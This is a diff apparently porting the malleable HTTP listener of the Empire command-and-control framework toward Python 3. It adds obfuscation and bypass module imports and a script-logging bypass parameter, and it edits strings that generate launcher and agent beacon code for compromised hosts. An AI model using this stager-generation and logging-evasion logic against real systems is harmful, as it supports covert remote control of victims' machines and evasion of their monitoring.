@@ -1,6 +1,34 @@
+from __future__ import print_function
 import os, sys, logging, time, copy, string, base64, json, random, ssl
 from pydispatch import dispatcher
 from flask import Flask, request, make_response, Response, send_from_directory
+
+# extras
+from builtins import str
+from builtins import object
+import logging
+import base64
+import sys
+import random
+import string
+import os
+import ssl
+import time
+import copy
+import json
+import sys
+import threading
+from pydispatch import dispatcher
+
+# Empire imports
+from lib.common import helpers
+from lib.common import agents
+from lib.common import encryption
+from lib.common import packets
+from lib.common import messages
+from lib.common import templating
+from lib.common import obfuscation
+from lib.common import bypasses
 
 # Empire imports
 from lib.common import helpers
@@ -208,7 +236,7 @@ class Listener:
 
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None,
-                          stager=None):
+                          stager=None, scriptLogBypass=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -437,7 +465,7 @@ class Listener:
                 if profile.stager.server.output.terminator.type == malleable.Terminator.HEADER:
                     launcherBase += "head=res.info().dict\n"
                     launcherBase += "a=head['%s'] if '%s' in head else ''\n" % (profile.stager.server.output.terminator.arg, profile.stager.server.output.terminator.arg)
-                    launcherBase += "a=urllib.unquote(a)\n"
+                    launcherBase += "a=urllib.parse.unquote(a)\n"
                 elif profile.stager.server.output.terminator.type == malleable.Terminator.PRINT:
                     launcherBase += "a=res.read()\n"
                 else:
@@ -958,7 +986,7 @@ class Listener:
                 if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
                     header = profile.get.server.output.terminator.arg
                     sendMessage += "        data = res.info().dict['"+header+"'] if '"+header+"' in res.info().dict else ''\n"
-                    sendMessage += "        data = urllib.unquote(data)\n"
+                    sendMessage += "        data = urllib.parse.unquote(data)\n"
                 elif profile.get.server.output.terminator.type == malleable.Terminator.PRINT:
                     sendMessage += "        data = res.read()\n"
 
